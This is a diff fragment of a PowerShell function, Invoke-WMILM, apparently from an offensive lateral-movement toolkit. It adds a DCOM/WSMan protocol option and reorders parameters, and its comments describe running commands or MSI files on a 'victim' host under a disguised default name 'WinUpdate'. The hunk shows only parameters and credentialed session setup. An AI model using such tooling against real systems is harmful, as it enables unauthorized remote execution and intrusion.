@@ -59,28 +59,33 @@ function Invoke-WMILM {
         [ValidateSet("Product", "Service", "Job", "Task", "Provider", "DerivedProcess")]
         [String]
         $Type = "Service",
-
+        
         [Parameter(Mandatory = $false, Position = 2)]
+        [ValidateSet("DCOM","Wsman")]
         [String]
-        $Name = "WinUpdate",
+        $Protocol = "DCOM",
 
         [Parameter(Mandatory = $false, Position = 3)]
         [String]
+        $Name = "WinUpdate",
+
+        [Parameter(Mandatory = $true, Position = 4)]
+        [String]
         $Command,
 
-        [Parameter(Mandatory = $false, Position = 4)]
+        [Parameter(Mandatory = $false, Position = 5)]
         [String]
         $CommandArgs,
 
-        [Parameter(Mandatory = $false, Position = 5)]
+        [Parameter(Mandatory = $false, Position = 6)]
         [Bool]
         $CleanUp = $false,
 
-        [Parameter(Mandatory = $true, Position = 6)]
+        [Parameter(Mandatory = $true, Position = 7)]
         [string]
         $Username,
 
-        [Parameter(Mandatory = $true, Position = 7)]
+        [Parameter(Mandatory = $true, Position = 8)]
         [string]
         $Password
     )
@@ -91,8 +96,8 @@ function Invoke-WMILM {
         # Create a remote CIM session
         $SecurePass = ConvertTo-SecureString -String $Password -asplaintext -force
         $cred = new-object -typename System.Management.Automation.PSCredential -ArgumentList @($Username, $SecurePass)
-        $Opt = New-CimSessionOption -Protocol "DCOM"
-        $Session = New-Cimsession -ComputerName $Target -SessionOption $Opt -Credential $Cred
+        $Opt = New-CimSessionOption -Protocol $Protocol
+        $Session = New-Cimsession -ComputerName $Target -SessionOption $Opt -Credential $Cred -ErrorAction Stop
 
         # Lateral movement using the Win32_Product class. Command needs to be a path to an msi file on the victim
         if ($Type -Match "Product") {
